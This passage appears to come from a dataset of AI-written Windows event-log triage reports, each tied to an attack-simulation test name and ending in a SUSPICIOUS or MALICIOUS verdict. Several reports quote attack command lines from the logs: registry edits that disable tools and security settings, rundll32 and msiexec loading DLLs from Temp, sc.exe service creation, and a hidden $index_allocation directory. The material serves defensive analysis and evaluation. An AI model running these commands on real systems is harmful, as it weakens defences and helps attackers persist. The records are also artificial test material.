   - Multiple instances of `wevtutil.exe` and `conhost.exe` were run in quick succession.
   - While both utilities are Windows-built tools, abnormal use may indicate an attempt to tamper with event logs (`wevtutil`) or execute commands in a console-like environment (`conhost`). When linked with other suspicious activities, this can be particularly concerning.

3. **Execution of `whoami.exe`:**
   - There is a log entry indicating the execution of `whoami.exe`. Although this command is often used for diagnostic purposes to check the current context, it may also be used post-exploitation by attackers to determine current privileges.

4. **Privileged Account and Anomalous Logon Activities:**
   - User `admin_test` was observed executing processes with elevated privileges.
   - The security log shows a logon using the `NTLM` process from a remote IP address, which could be indicative of lateral movement or unauthorized access.

#### Assessment:
Based on the analysis:

- The use of `WMIC` with an external script URL is a key indicator of potentially malicious activity. This action is suspicious and often associated with compromise attempts.
- The combination of enhanced privileges and the use of native Windows utilities (`whoami`, `wevtutil`, `cmd.exe`) might indicate malicious attempts to cover tracks and further explore the system.
- While the execution of Windows utilities alone might be benign, the context (e.g., from IP addresses, elevated privileges, and remote script execution) suggests a pattern typical of malicious behavior.

### Resolution: **MALICIOUS**

#### Recommendations:
- **Immediate Incident Response:** Isolate the affected system from the network to prevent potential spread.
- **Conduct a Full Malware Scan:** Use antivirus and endpoint detection and response (EDR) tools to identify and remove potential threats.
- **Review Network Activity:** Look for any unusual outgoing traffic especially to or from the IP identified.
- **Audit Account Activities:** Review user activities, especially the `admin_test` account for unauthorized access or privilege escalation.
- **Update Security Configurations:** Ensure all patches are applied, and consider strengthening security policies and network access controls to prevent similar incidents in the future.
- **User Awareness Training:** Provide training to users about the risks of executing unknown scripts and external resources, emphasizing the importance of security hygiene."
DisallowRun Execution Of Certain Applications,"Upon analyzing the provided logs, here are my observations and analysis:

### Sysmon Log Analysis:
1. **Process Executions**:
   - Multiple instances of common Windows processes like `wevtutil.exe`, `conhost.exe`, `svchost.exe`, `cmd.exe`, and `reg.exe` initiated by `SERVER002\admin_test`, which is a privileged user account.
   - A notable point is the execution of `cmd.exe` with the following command-line arguments: 
     ```
     ""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /t REG_DWORD /d 1 /f & amp; reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art1 /d ""regedit.exe"" & amp; reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art2 /d ""cmd.exe""
     ```
   - The use of `reg.exe` to modify registry keys is directed at disabling the execution of `regedit.exe` and `cmd.exe`, which is potentially malicious behavior. This can be a tactic used to hinder system recovery or forensic analysis.

2. **Privilege Levels**:
   - Several process executions occur under `High` integrity level, potentially indicating that the actions were executed with elevated privileges.

3. **Process Ancestry**:
   - Parent processes such as `wsmprovhost.exe` and other System processes seem standard but the sequence and the combination of parent-child processes need further scrutiny especially with registry edits involved.

### Application, System, Security Events:
- **Application Log**: Shows an event with `Microsoft-Windows-Security-SPP` related to the Software Protection Platform Service. This does not appear to have direct suspicious links based on the information provided.
  
- **System Log**: Contains a time service event, which seems routine network time protocol (NTP) related. 

- **Security Log**: No suspicious entries noted at this time due to lack of detailed entries provided.

### Conclusion:
The logs reveal potentially suspicious activity, primarily the use of command line tools to alter system registry settings in a manner that prevents certain system tools from running. This behavior can be indicative of malicious intent to restrict access or functionality for administrative tools.

### Resolution:
- **SUSPICIOUS**: 
  - While the logs do not provide a conclusive, immediate threat that is overtly malicious, altering registry settings to disable key system utilities without clear, benign reasoning must be treated as potentially threatening. 
  - Further investigation is recommended to determine the motive behind these registry edits and whether any other indicators of compromise exist on this system. Ensure that no external unauthorized access is present and validate with the system's administrator if such changes were authorized and necessary.
"
Mimic Ransomware - Enable Multiple User Sessions,"Upon reviewing the provided Windows event logs, I have identified the following points of analysis:

1. **Analysis of Sysmon Logs**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are being executed by the account `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate utility used to manage event logs, its frequent and repetitive invocation, especially in conjunction with `conhost.exe`, could be suspicious if not part of normal administrative tasks. Additionally, the sequence in which these processes run suggests that they may be spawning each other recursively in quick succession, which could support scenarios such as automatic log clearing or manipulation.
   - The `cmd.exe` process is executed with a command to modify the registry: `reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f`. This command changes the settings for allowing multiple terminal services sessions, which could be an indicator of attempt to enable concurrent RDP sessions. This action could suggest malicious intent as it involves modifying system settings potentially without authorization.

2. **Security Logs**:
   - There are events with ID `4616` indicating the system time was changed by `svchost.exe` running with the `LOCAL SERVICE` user. Changing system time can be legitimate, but it can also be part of efforts to evade detection by altering time stamps of logs or other system activities.

3. **Application Logs**:
   - No anomalies significant enough have been observed in this section that could indicate a security threat.

4. **System Logs**:
   - There are changes in time zone settings and time updates, related to system time settings adjusted by svchost processes, consistent with observations in the security log.

### Assessment:

- **SUSPICIOUS Activity**: There is a notable suspicious behavior in the logs related to repeated execution of system utilities in potentially abnormal sequences that wouldn't typically be part of standardized operations, along with registry modifications that could enable unauthorized remote access.
  
### Recommendation:
- Further investigation is warranted to determine the legitimacy of these activities. Immediate actions should include validating whether the observed activities were authorized administrative tasks. Specifically:
  - Verify with the system administration team if the registry modification was part of an approved change or if any scripts were running that could explain the log behavior.
  - Check if `SERVER002\admin_test`'s credentials were used recently for any administrative purposes or if their usage deviates from normal patterns.
  - Review security policies around access to and modification of system processes and registry settings.
  
Final Resolution: **SUSPICIOUS** due to the nature of registry modification and unusual system utility executions that warrant further verification and investigation."
Rundll32 ieadvpack.dll Execution,"Upon reviewing the provided event logs from October 26, 2024, I conducted an analysis considering suspicious activities such as unusual processes, abnormal command-line executions, or privilege elevation. Here's a detailed breakdown:

1. **Unusual Processes and Commands:**
   - **Powershell Execution:** A process initiated from `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`. The specified user was `SERVER002\admin_test`. Powershell is a legitimate command-line shell, but its usage can indicate malicious intent, especially when used with scripts or commands to retrieve data, manipulate files, or initiate attacks.
   - **CMD Execution with Rundll32:** The `cmd.exe` was executed with a command-line argument utilizing `rundll32.exe` to execute `ieadvpack.dll, LaunchINFSection`. This is suspicious as `rundll32.exe` can be misused to execute scripts or malicious tasks from DLLs. The execution occurred in the `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\src` directory, which isn't a standard execution path for Windows system tasks.

2. **Repeated System and Application Behavior:**
   - **Frequent Wevtutil and Conhost Executions:** Multiple instances of `wevtutil.exe` and `conhost.exe` started within seconds of each other under the same user `SERVER002\admin_test`. `Wevtutil.exe` is a legitimate tool for managing event logs, and `conhost.exe` is a legitimate console host. However, frequent and sudden repetitions of these processes suggest script automation and lack sufficient detail to inherently classify them as malicious without understanding the broader context.
   
3. **Microsoft Edge Update Executions:**
   - Several Microsoft Edge-related processes were seen (`MicrosoftEdgeUpdate.exe` and related tasks). These processes appear to be legitimate updates and maintenance tasks by Microsoft Edge Update. There is no immediate indication in the logs these were used maliciously, although such processes can be exploited if impersonated.

4. **Security and System Events:**
   - **Security Logs:** Events related to system account log-ons and privilege assignments appear consistent with benign system operations (e.g., Event ID 4624 for system logon).
   - **Application Logs:** Logs indicate regular software protections and Edge update service actions. No clear indicators suggest tampering or compromise alone from these records.

**Conclusion and Recommendations:**

- **Conclusion:** While the identified `cmd.exe` execution involving `rundll32.exe` and the context of this activity is unusual and potentially indicative of malicious strategizing, the present logs without more context do not provide conclusive evidence of an active threat or compromise. The frequency of legitimate system and Edge Update processes, despite their repetitiveness, aligns with standard software behavior under certain configurations.
- **Resolution:** **SUSPICIOUS** - Activity involving `cmd.exe` and `rundll32.exe` with extraordinary paths should be further investigated, as such commands may obfuscate or exploit vulnerabilities if misconfigured or misused.
- **Guidance:** Conduct a more thorough threat hunt with enhanced monitoring focusing on PowerShell commands, `cmd.exe` calls, and any related use of `rundll32.exe`. Examine user actions and cross-check any unusual file operations or alterations. Verify the legitimacy of operational scripts and all job taskings linked to `admin_test` during this session timeframe. Ensure endpoint protection is actively logging these events for better insight in subsequent analyses."
Create Hidden Directory via $index_allocation,"After reviewing the provided Windows event logs, several points of interest and potential areas of concern have been identified:

### Key Observations:

1. **Security Logs (Event ID 4616)**
   - Multiple events indicate system time changes. This can be suspicious if the time is being manipulated to hide activities. However, both time changes logged happen in rapid sequence without significant alteration, indicative of a regular time synchronization.

2. **Sysmon Logs**
   - Multiple legitimate system utilities such as `hostname.exe`, `whoami.exe`, `conhost.exe`, and `wevtutil.exe` are executed with the user ""SERVER002\admin_test."" These executables are common Windows processes often used in audits and system information retrieval. Their presence in logs is not inherently suspicious.
   - **Event involving `cmd.exe`:** 
     - A particularly interesting entry is observed for `cmd.exe` (Event ID 18006), which shows the command:
       ```
       ""cmd.exe"" /c md %%temp%%\...$.......::$index_allocation & echo too many secrets > %%temp%%\...$.......::$index_allocation\secrets.txt
       ```
     - The command appears to create a directory with an alternate data stream (`::$index_allocation`) and writes a text file within it. The use of alternate data streams is typically indicative of suspicious activity as it's less common for legitimate software to use this. This could be an attempt to obfuscate data or hide information.

3. **Application and System Logs**
   - No application or system events directly indicate malicious activities. Logs generally reflect normal administrative activities.
   - One event showcases some software protection activities but without malicious indicators.

### Assessment:

The logs show mostly routine system activities and legitimate command executions by a user ""admin_test"" on ""SERVER002."" The commands and processes would appear normal under certain administrative or scripting contexts. However, the command execution involving alternate data streams in Sysmon logs indicates a potential attempt to hide data, which is not common in typical usage and can be a tactic employed by malware or hackers.

### Resolution:

- **SUSPICIOUS**

### Recommendations for Further Action:

- **Detailed Analysis:** Investigate the purpose and timing of the executed `cmd.exe` operation. Determine if this action was part of any legitimate script or administrative task.
- **Malware Scan:** Conduct a comprehensive scan of the system for any known malware signatures, particularly focusing on files related to alternate data streams.
- **Log Correlation:** Check for any other anomalous or coinciding events around the time the suspicious command was run to identify any patterns or corroborating evidence of unauthorized activity.
- **User Verification:** Validate activities of the user ""SERVER002\admin_test"" to ensure they were authorized and aware of these actions.

This step will help in establishing whether the anomalous entries suggest malicious intent or unauthorized changes, or if they are benign under specific lawful applications."
Hide Windows Clock Group Policy Feature,"Upon reviewing the provided data logs, several observations and patterns can be noted:

### Analysis:

1. **Frequent Execution of System Utilities and Commands:**
   - The execution of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and Windows updates related processes like `MicrosoftEdgeUpdate.exe` appears throughout the logs. 
   - The consistent use of utilities like `wevtutil.exe` (Windows Event Log administration), `cmd.exe`, and `reg.exe` is worth noting, especially the command executed via `cmd.exe` to alter registry settings for `HideClock`. This particular command modifies user interface settings which although not inherently malicious, can suggest unauthorized or unexpected changes if not expected as part of regular IT adjustments.

2. **Process Creation and Interaction:**
   - The processes are executed under the `SERVER002\admin_test` user context with a high integrity level, indicating they have administrative privileges.
   - `cmd.exe` is observed executing a command to add a registry key which hides the clock on the Windows taskbar (`HideClock`). While this is not typically malicious, unauthorized changes to registry settings can sometimes indicate attempts to disrupt or modify user interface behavior.

3. **Windows Update Activity:**
   - Several activities by Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) appear under the `NT AUTHORITY\SYSTEM` context, which is normal for system-level update services.
   - These processes include legitimate update operations and interactions typical of regular system maintenance or updates.

4. **Process Inheritance:**
   - Process spawning patterns (e.g., `wsmprovhost.exe` spawning other processes like `hostname.exe` and `whoami.exe`) exhibit legitimate use of Windows Management Instrumentation (WMI), which can sometimes be exploited but without additional context or anomalies, looks standard in these logs.

5. **Network Services and System Time Updates:**
   - Regular system logs such as time synchronization to `time.windows.com` and operation of service processes like `svchost.exe` do not indicate anomalies or malicious activity in the absence of suspicious flags.

### Assessment:

Given the information provided, there are no clear indicators of compromise that definitively point to malicious activity. However, the command to modify registry settings (`HideClock`) should be verified against expected administrative activities to ensure that it is legitimate.

### Resolution:

**SUSPICIOUS**

- The activity regarding registry modifications appears unusual if not aligned with expected administrative tasks, and it warrants further investigation to verify legitimate intent.
- No evidence suggests that any processes were exploited or that there was unauthorized access, but verifying who executed the registry change and confirming the purpose is recommended.
- Ensure that access control and log integrity policies are in place to prevent unauthorized registry changes in the future."
WMI Win32_Product Class - Execute Local MSI file with an embedded DLL,"Upon analyzing the provided logs, several points of potential concern have been identified. Here's a detailed breakdown of the suspicious activity observed:

1. **PowerShell Usage**:
   - There are several events involving the execution of PowerShell commands. Notably, we see the use of `powershell.exe` with the `Invoke-CimMethod` to install an MSI package from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_DLL.msi`). Execution of scripts or commands from PowerShell, especially involving MSI packages, is often a technique used by attackers to install malicious software.

2. **Command-line Execution**:
   - The command `powershell.exe -nop -Command Write-Host CustomAction export executed me; exit` is benign by itself but can be suspicious as the `-nop` (No Profile) switch is commonly used in malicious activity to load PowerShell without user profiles, enabling stealthier operations.

3. **Process Spawning**:
   - The spawning of processes such as `wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe`, and others like `conhost.exe` in close proximity could indicate enumeration activities or script/program execution chains characteristic of post-compromise activities.

4. **Installation Activity**:
   - The logs show the use of `msiexec.exe` and related installation activity associated with an MSI file from a suspicious path. The MSI files in temporary directories can be a red flag, especially with filenames like `data.007_DLL.msi` which are not typically descriptive or recognized.

5. **Edge Update Activity**:
   - There is significant `Microsoft Edge Update` activity. However, the legitimate Edge update service is commonly executed under `NT AUTHORITY\SYSTEM`, which appears to be the case here. Without specific indicators of misuse within these logs, this activity can often be benign.

**Assessment and Resolution**:
- The execution of PowerShell with parameters that could be used maliciously, combined with system and MSI execution activity, warrants further investigation. Although there are no explicit signs confirming malicious execution (such as known malware signatures), the pattern of installation from a temporary directory using PowerShell and MSI is suspicious.
  
**Resolution**: SUSPICIOUS

**Guidance & Next Steps**:
- Conduct a deeper investigation into the origins and intention of the MSI package installed from the temporary directory. Validate its legitimacy.
- Examine network logs and endpoint protections for any complementary evidence of unusual behavior around the time these events occurred.
- Conduct a thorough inspection of the system for any unauthorized changes or additional installed software resulting from these actions.
- Enable and configure defensive measures such as more refined PowerShell logging, application whitelisting, and behavioral analysis to detect and prevent potential misuse moving forward."
Activate Windows NoPropertiesMyDocuments Group Policy Feature,"After analyzing the provided Windows event logs, the following observations have been made:

1. **Time Changes**: There are multiple events related to time changes as evidenced by Event ID 4616 in the Security log and related events in the System log. These events show that the system time was adjusted slightly. While time adjustments aren't inherently suspicious if logged correctly and expected (e.g., system boot, time zone change corrections, or time updates from an NTP server), they could potentially be used for anti-forensic activities or to bypass time-based security controls. However, in this context, the time changes appear minor and could be consistent with standard operations.

2. **Process Executions**:
   - **Command and Registry Changes**: 
     - There is a suspicious execution of `cmd.exe` running with a command to modify the registry: 
       ```
       ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f
       ```
       - This action raises concern because altering registry policies, particularly under `Explorer`, can modify system behavior and potentially be used for malicious purposes, such as disabling user interface components or restricting user access to certain features.

   - **Use of Administrative or System Processes**:
     - The logs indicate multiple instances of legitimate system processes like `svchost.exe`, `wevtutil.exe`, and `conhost.exe` being launched. The user context seems consistent with authorized user actions, but it is notable that these processes are frequently associated with both regular operations and potential malicious use if hijacked or used in unusual contexts.

3. **Edge Updater**:
   - The logs contain numerous entries related to `MicrosoftEdgeUpdate.exe`, reflecting normal update activities by the Microsoft Edge Update process running under `NT AUTHORITY\SYSTEM`. The logs indicate update checks and installations consistent with Microsoft Edge auto-update operations. Nothing appears overtly suspicious in terms of unusual behavior or unexpected resources being accessed in relation to this process.

### Assessment:
- **SUSPICIOUS**: While many of the activities could be consistent with benign administrative tasks or automated system maintenance, the execution of the command that modifies the registry stands out as potentially problematic. This type of activity, depending on the context, might be indicative of attempts to modify user environment settings that could be consistent with preparing the system for malicious use or maintaining persistence.

### Guidance:
1. **Further Investigation Required**:
   - **Contextual Verification**: Confirm whether the command that modifies the registry aligns with known administrative or maintenance activities. Verify with system administrators if such actions were planned or documented.
   - **User Verification**: Verify the legitimacy of access by the involved user accounts and the need for the processes that run under them.
   - **Baseline Comparison**: Compare the current changes against a baseline snapshot of expected registry settings and system configurations.

2. **Monitor Continuously**:
   - Continue to monitor for any further registry modifications, particularly those that affect user environment configurations or policy settings, which could suggest ongoing malicious activities.
   
3. **Security Measures**:
   - Ensure that endpoint protection systems are up-to-date and scan for any indicators of compromise or anomalies based on known threat indicators.

This analysis concludes that the activity bears examination, and proactive steps should be taken to ensure system integrity and confirm the activities are authorized and safe."
Msiexec.exe - Execute the DllRegisterServer function of a DLL,"After analyzing the provided log entries, the following observations and assessment are made:

1. **Normal System Updates**: 
   - The entries for Microsoft Edge Update processes (e.g., `MicrosoftEdgeUpdate.exe` and related Setup processes) seem consistent with typical software updates. These processes are run by `NT AUTHORITY\SYSTEM`, which is appropriate for system-level updates.

2. **Unusual Elevated Commands**:
   - Several instances of ""wevtutil.exe"" and ""conhost.exe"" processes being executed by a user labeled as `SERVER002\admin_test` raise concerns. `wevtutil.exe` is a utility used to manage Windows event logs, and frequent execution without clear purpose could be suspicious.
   - There's a pattern of running certain utilities (`whoami.exe`, `cmd.exe`) under a high-integrity level for the same user (`SERVER002\admin_test`), suggesting either scripting or automated tasks, or an investigation of system permissions and configurations.

3. **Potential DLL Execution**:
   - A suspicious command `cmd.exe /c c:\\windows\\system32\\msiexec.exe /y ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\MSIRunner.dll""` is noted. The execution of `msiexec.exe` with `/y` switch, which is used for DLL registration, in a temp directory is uncommon and potentially malicious.
   - The file path and execution context indicate an attempt to register or execute a DLL file possibly linked to unintended actions or software.

**Assessment**:
- The actions related to Microsoft Edge Update are consistent with regular update behavior and not inherently suspicious.
- Repeated use of `wevtutil.exe` by an admin user in close succession, and using high-integrity level processes, combined with the command involving `msiexec.exe` and a DLL from a temp path, suggest activity outside the norm for typical user actions.

**Resolution**:
- **SUSPICIOUS**: The log entries contain behaviors, such as the use of `wevtutil.exe`, `msiexec.exe` for DLL registration, that suggest the possibility of inappropriate usage or compromise, necessitating further investigation to rule out malicious intent or authorized scripting/automation tasks.

**Guidance**:
- Further investigation is required:
  - Confirming the legitimacy of the `admin_test` user's actions.
  - Verifying if the actions with `wevtutil.exe` and DLL registration were intentional and authorized.
  - Checking the integrity and origin of the `MSIRunner.dll` file.
- It might be prudent to tighten monitoring on process creation, particularly around critical system utility usage by non-system accounts."
Create and Hide a Service with sc.exe,"Upon analyzing the provided Windows event logs, the following points of interest and indicators of potentially malicious activity have been observed:

1. **Time Change Events**:
   - The logs show Event ID 4616 and 1 indicating changes in system time. The discrepancy between the previous and new time is minimal, suggesting the adjustment was for synchronization purposes. However, repeated and unexplained time changes can sometimes indicate tampering or unauthorized adjustments.

2. **Security Log Anomalies**:
   - **EventID 4672**: The user ""admin_test"" was granted privileges that indicate an elevated level of access, including `SeDebugPrivilege` and `SeLoadDriverPrivilege`. These can be leveraged for privilege escalation attacks.
   - **Logon Type 3** entries for ""admin_test"" from workstation ""DESKTOP-3HL5B2P"" using NTLM authentication are noted. This indicates a network-based logon session, which is normal in many environments; however, it should be scrutinized when coupled with other potentially suspicious activity.

3. **Creation of a Service with Suspicious Path**:
   - The creation of a service named ""fileService"" pointing to ""C:\Windows\System32\calc.exe"" is captured in both the security and sysmon logs. The use of `calc.exe` as a service is atypical and suspicious, often indicative of an obfuscation technique to perform unauthorized actions under trusted system processes.

4. **Sysmon Logs Showing Unusual Command Line Activity**:
   - The command line activity for creating a service (`sc.exe create fileService binPath= ""C:\Windows\System32\calc.exe""`) is logged, which reflects the manipulation and creation of services possibly for persistence.
   - Multiple executions of fundamental tools like `whoami.exe`, `cmd.exe`, and `HOSTNAME.EXE` from high integrity levels are seen throughout. While usage of these tools is generally legitimate, in certain contexts they can indicate reconnaissance activity or enumeration when correlated with other suspicious actions.

5. **Edge Update Proceedings**:
   - Logs consistently show activities from ""MicrosoftEdgeUpdate.exe"". While this activity might be benign, it is worth checking the legitimacy of these update processes and files given the other mounting suspicious indicators.

### Threat Assessment

The combination of altered system time, the creation of a potentially insecure service using a benign executable (`calc.exe`), elevation of privileges with extensive access rights for ""admin_test"", and network logins suggest that there is suspicious activity that requires further investigation. Some of these actions align with tactics commonly seen in post-exploitation phases of a cyber attack, particularly those aimed at establishing persistence or further compromising network security.

### Guidance on Resolution

- **Resolution: SUSPICIOUS**

The logs indicate suspicious activity, especially concerning the manipulation of services and elevation of privileges. Further investigation is recommended, focusing on:
- Verifying the integrity and purpose of the service ""fileService"" and the processes associated with the user ""admin_test"".
- Examining network traffic and the origin of network logon attempts.
- Conducting detailed reviews on the access control and potentially lateral movement stemming from ""DESKTOP-3HL5B2P"".
- Engaging in an Endpoint Detection and Response (EDR) review for further context on file operations and command executions.

I recommend implementing enhanced monitoring on ""Server002"" and ""DESKTOP-3HL5B2P"", reviewing security patches, and considering user training on recognizing potential threats."
Enabling Restricted Admin Mode via Command_Prompt,"Upon analyzing the provided Windows event logs, I have identified several key points and indicators of potentially suspicious or malicious activity.

### Analysis:

1. **Time Manipulation Events:**
   - The Security and System logs show multiple `EventID: 4616` events indicating changes in the system clock time (`NewTime` is earlier than `OldTime`) by the `svchost.exe` process running under `NT AUTHORITY\LOCAL SERVICE`. Time changes on a system, especially backward adjustments, can be indicative of an attempt to cover tracks or disrupt log timelines. This is potentially suspicious.

2. **Registry Modification Using Command Line Interface:**
   - A Sysmon log `EventID: 1` indicates the execution of `cmd.exe` with the command: `reg add ""hklm\system\currentcontrolset\control\lsa"" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0`. This command modifies a critical registry setting related to login security, which may indicate attempts at weakening system security defenses.

3. **Sequential Process Creation:**
   - Several `wevtutil.exe` and `conhost.exe` processes are launched by the user `SERVER002\admin_test` in rapid succession as evidenced by multiple Sysmon `EventID: 5`. This behavior could be related to normal system operations, but it stands out in its repetitive and frequent nature over a short timeframe, possibly indicating automated activity or scripting.

4. **Command Line Execution of `whoami.exe` and `hostname.exe`:**
   - The usage of `whoami` and `hostname` commands can be common for legitimate purposes; however, their execution close in time to other suspicious activity may suggest enumeration actions associated with reconnaissance during a compromise.

5. **EdgeUpdate Processes:**
   - The logs show multiple instances of `MicrosoftEdgeUpdate.exe` running under `NT AUTHORITY\SYSTEM` with different command line arguments (`/svc`, `/regsvc`, `/ping`, etc.). While this might simply demonstrate legitimate software update checks, the presence of these events, given the context of other suspicious activities (like registry changes), cannot be outright dismissed without further scrutiny.

### Conclusion:

Based on the identified activities, the logs exhibit signs that qualify them for further investigation—especially the registry modification and the system time changes. These actions carry potential indicators of malicious behavior, and further examination is required to validate any compromise or determine if these are part of scheduled or benign administrative tasks.

### Final Assessment:
**Resolution: SUSPICIOUS** - While there is suspicious activity noted with time manipulation, registry changes, and the nature of processes executed, a definitive conclusion of malicious intent cannot be asserted without additional context or corroborative evidence. Further investigation should include:
- Verifying with system administrators about any scheduled tasks or maintenance activities that might explain these logs.
- Checking for any external anomalies or alerts around the same timestamps.
- Conducting a thorough scan and integrity check of the system and registry settings."
Compiled HTML Help Remote Payload,"Upon reviewing the provided logs, I have identified several areas of interest that could indicate suspicious or potentially malicious activity:

1. **Time Manipulation**: Multiple event logs from the Security log (EventID 4616, with changes in system time) suggest that time manipulation occurred. This is frequently associated with the efforts of malicious actors attempting to cover their tracks or disrupt logging accuracy for forensic analysis.

2. **Elevated Privileges**: High-privilege events (EventID 4672) often occur when a user or service obtains special rights, like ""SeDebugPrivilege"". This can be legitimate, however, if these privileges are being granted unexpectedly to accounts like ""admin_test"", it might indicate an attempt at privilege escalation.

3. **Command Execution**: The Sysmon log reports the execution of several system utilities by the user ""admin_test"", such as `wevtutil.exe`, `conhost.exe`, `cmd.exe` with potentially harmful arguments like `cmd.exe /c hh.exe ...`. The execution of `hh.exe` with URLs suggests possible downloading or execution of a compiled help file, which can be a vector for payload delivery.

4. **Suspicious PowerShell Activity**: The PowerShell log (with EventID 600) indicates the use of PowerShell with restricted policies, which can sometimes be bypassed by attackers to run scripts. The command details and purpose appear obfuscated or used to enumerate or modify sensitive system settings.

5. **Remote Logon Sessions**: Event 4624 indicates logons using NTLM authentication from external sources (IP address log matches) with administrative accounts, which might suggest lateral movement or unauthorized remote access.

6. **Excessive Event 4798 Entries**: These logs highlight enumeration of local user groups, often preceding privilege escalation attacks. The frequent enumeration by processes like `taskhostw.exe` and `CompatTelRunner.exe` could denote reconnaissance activity.

7. **Use of System Tools for Recon**: Events describe tools like `wevtutil.exe`, `hostname.exe`, as well as `whoami.exe` run under elevated privileges, suggesting potential reconnaissance activity.

**Assessment and Guidance:**
- **Resolution - SUSPICIOUS**: The logs present activities that resemble typical malicious behavior, including privilege escalation, execution of potentially harmful command lines, and reconnaissance. These activities do not definitively confirm an attack but strongly suggest the need for closer investigation.

**Recommendations:**
1. **Immediate Investigation**: Perform an in-depth review of the ""admin_test"" account and any recon activities linked to it.
2. **Network Analysis**: Investigate external connections from IP `192.168.0.102` and other remote sources listed.
3. **Audit PowerShell and CMD Use**: Ensure proper logging and restrictions are in place for PowerShell and command-line executions.
4. **Monitor Time Synchronization**: Review and monitor time settings and related system configurations.
5. **User and Privilege Review**: Consider an exhaustive audit of user privileges, ensuring that only necessary privileges are provided to users.
6. **Check for Persistence**: Inspect the system for any persistent mechanisms such as scheduled tasks or unknown services that might maintain an attacker's access."
Rundll32 with Control_RunDLL,"**Analysis of Windows Event Logs:**

**Suspicious or Anomalous Behavior:**

1. **Use of `rundll32.exe` with DLL in Temp Directory:**
   - Entry: `""cmd.exe"" /c rundll32.exe shell32.dll,Control_RunDLL ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\calc.dll""`
   - This is highly suspicious as `rundll32.exe` is being leveraged to execute a DLL located in a temporary directory often associated with malicious activity or persistence mechanisms.

2. **Frequent Execution of `conhost.exe` and `whoami.exe`:**
   - `conhost.exe` and `whoami.exe` are frequently executed, which is uncommon unless there's a script or malware attempting to enumerate the system or obfuscate behaviors by running multiple instances of system utilities.

3. **Execution of PowerShell:**
   - Powershell execution is noted (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) without provided command-line details. PowerShell is a powerful tool often used by attackers for malicious scripting.

4. **Use of `wevtutil.exe`:**
   - `wevtutil.exe` is used by administrators to clear event logs but is also a tool that can be used by attackers to cover tracks. The presence of multiple executions in a short time span might suggest log tampering.

5. **Multiple Instances of `MicrosoftEdgeUpdate` Executables:**
   - While legitimate, the number and sequence of these processes could indicate an issue with Edge Update services or possibly exploitation of these processes.

**Indication of Malicious Activity or Compromise:**

- The DLL execution in the temporary directory (`calc.dll`) via `rundll32.exe` implies malicious intent. This pattern is often indicative of an adversary trying to execute arbitrary code on the system.

- The `cmd.exe` execution with rundll32 points to an executed command that is unconventional and often seen in malware behavior.

**Assessment of the Situation:**

- The detected behavior suggests suspicious activity with a significant indicator of potential compromise, especially the `rundll32.exe` and `calc.dll`. These actions align with commonplace tactics used in attacks to maintain persistence, escalate privileges, or exfiltrate data.

**Threats or Risks Identified:**

- Execution of potentially harmful DLLs from a temporary folder highlights a risk of remote code execution.
- Potential clearing of logs using `wevtutil.exe` which could hinder future forensic analysis efforts.
- PowerShell and frequent utility execution hint at script automations or adversarial reconnaissance.

**Guidance on How to Proceed:**

- Immediately isolate the affected Host (Server002) from the network to prevent further potential damage or data exfiltration.
- Perform a detailed malware scan on the host focusing on the temporary folders or scripts running in memory.
- Review the `Eventlogs` for any additional suspicious activity, especially around the time of the `rundll32.exe` execution.
- Evaluate and monitor other systems in the same network segment for similar activities.
- Conduct a full security audit and prohibitively alert the system of unauthorized or non-standard usages of `rundll32.exe` and PowerShell in the environment. 

**Final Resolution:**

- **MALICIOUS** - The observed activity strongly indicates malicious intent with high-confidence indicators of compromise, such as the execution of `rundll32.exe` with a DLL from a temporary directory. Immediate action and further investigation are recommended."
Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell,"### Analysis and Findings:

**1. Application Log:**
- Observed service stops (`edgeupdate`) logged in quick succession. This could be related to routine service configuration changes or updates, but the absence of any other relevant context in these logs limits detailed interpretation.

**2. System Log:**
- Multiple `Kernel-General` events related to time changes are observed. These events can occur during normal operations such as daylight saving adjustments or time synchronization, especially if the system is syncing time with an external time server like `time.windows.com`. There is no evidence suggesting malicious tampering with system time settings.

**3. Windows PowerShell Log:**
- A PowerShell script is executed to alter registry protocols for http and https to `0`. Modifying these settings could indicate attempts to circumvent standard browser trust or security settings, potentially exposing the system to insecure communications. This behavior is suspicious and should be reviewed further to determine if it aligns with intended administrative tasks or is part of a misconfiguration.

**4. Sysmon Log:**
- The Sysmon logs show consistent activity with standard system processes (e.g., `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) and Microsoft Edge Update operations. 
- Notably, execution of PowerShell with elevated privileges and its related processes were seen, matching the PowerShell registry alteration captured previously. 
- The repeated `MicrosoftEdgeUpdate.exe` operations suggest legitimate software update activity, with no apparent abnormalities outside the PowerShell execution context.

**5. Security Log:**
- Time changes captured again here align with the `System Log` and likely result from routine time synchronization operations.

### Assessment:

The logs present some activities that warrant closer inspection:

- The PowerShell activity manipulating registry settings for protocols is a potentially suspicious action.
- Although consistent with software update patterns, the timing and frequency of Microsoft Edge Updates should be validated against expected update schedules.

### Resolution:

**SUSPICIOUS**

### Recommendations and Next Steps:

- **Further Investigate PowerShell Activity:** Review the origin and authorization of the script that modified registry settings to validate its legitimacy.
